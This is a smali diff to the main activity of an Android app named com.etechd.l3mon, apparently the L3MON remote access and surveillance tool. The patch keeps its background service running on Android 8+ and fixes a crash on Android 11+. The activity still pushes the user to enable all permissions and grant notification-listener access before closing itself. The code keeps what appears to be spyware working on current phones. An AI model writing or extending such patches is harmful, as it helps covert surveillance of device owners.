@@ -62,7 +62,7 @@
 
 # virtual methods
 .method protected onCreate(Landroid/os/Bundle;)V
-    .locals 9
+    .locals 4
     .param p1, "savedInstanceState"    # Landroid/os/Bundle;
 
     .line 21
@@ -73,6 +73,7 @@
 
     invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->setContentView(I)V
 
+    # Start service: use startForegroundService on Android 8+ (API 26+), startService on older
     .line 24
     new-instance v0, Landroid/content/Intent;
 
@@ -80,7 +81,20 @@
 
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x1a
+
+    if-lt v1, v2, :cond_old_start
+
+    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    goto :goto_service_started
+
+    :cond_old_start
     invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    :goto_service_started
 
     .line 25
     invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->isNotificationServiceRunning()Z
@@ -92,90 +106,47 @@
     if-nez v0, :cond_0
 
     .line 28
+    # Show plain Toast (no getView() styling - removed to fix NPE on Android 11+)
     invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->getApplicationContext()Landroid/content/Context;
 
     move-result-object v1
 
-    .line 29
-    .local v1, "context":Landroid/content/Context;
-    const-string v2, "Click \'Permissions\'\nEnable ALL permissions\n Click back x2\n Enable \'Package Manager\'"
+    const-string v2, "Enable ALL permissions in Settings"
 
-    .line 30
-    .local v2, "text":Ljava/lang/CharSequence;
     const/4 v3, 0x1
 
-    .line 32
-    .local v3, "duration":I
     invoke-static {v1, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
 
-    move-result-object v4
+    move-result-object v1
 
-    .line 34
-    .local v4, "toast":Landroid/widget/Toast;
-    invoke-virtual {v4}, Landroid/widget/Toast;->getView()Landroid/view/View;
-
-    move-result-object v5
-
-    const v6, 0x102000b
-
-    invoke-virtual {v5, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;
-
-    move-result-object v5
-
-    check-cast v5, Landroid/widget/TextView;
-
-    .line 35
-    .local v5, "v":Landroid/widget/TextView;
-    const/high16 v6, -0x10000
-
-    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setTextColor(I)V
-
-    .line 36
-    sget-object v6, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;
-
-    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V
-
-    .line 37
-    const/16 v6, 0x11
-
-    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setGravity(I)V
-
-    .line 38
-    invoke-virtual {v4}, Landroid/widget/Toast;->show()V
+    invoke-virtual {v1}, Landroid/widget/Toast;->show()V
 
     .line 41
-    new-instance v6, Landroid/content/Intent;
+    new-instance v1, Landroid/content/Intent;
 
-    const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
+    const-string v2, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
 
-    invoke-direct {v6, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
 
-    invoke-virtual {p0, v6}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
+    invoke-virtual {p0, v1}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
 
     .line 44
-    new-instance v6, Landroid/content/Intent;
+    new-instance v1, Landroid/content/Intent;
 
-    const-string v7, "package:com.etechd.l3mon"
+    const-string v2, "package:com.etechd.l3mon"
 
-    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
 
-    move-result-object v7
+    move-result-object v2
 
-    const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"
+    const-string v3, "android.settings.APPLICATION_DETAILS_SETTINGS"
 
-    invoke-direct {v6, v8, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V
+    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V
 
     .line 45
-    .local v6, "i":Landroid/content/Intent;
-    invoke-virtual {p0, v6}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
+    .local v1, "i":Landroid/content/Intent;
+    invoke-virtual {p0, v1}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
 
-    .line 48
-    .end local v1    # "context":Landroid/content/Context;
-    .end local v2    # "text":Ljava/lang/CharSequence;
-    .end local v3    # "duration":I
-    .end local v4    # "toast":Landroid/widget/Toast;
-    .end local v5    # "v":Landroid/widget/TextView;
-    .end local v6    # "i":Landroid/content/Intent;
     :cond_0
     invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
 
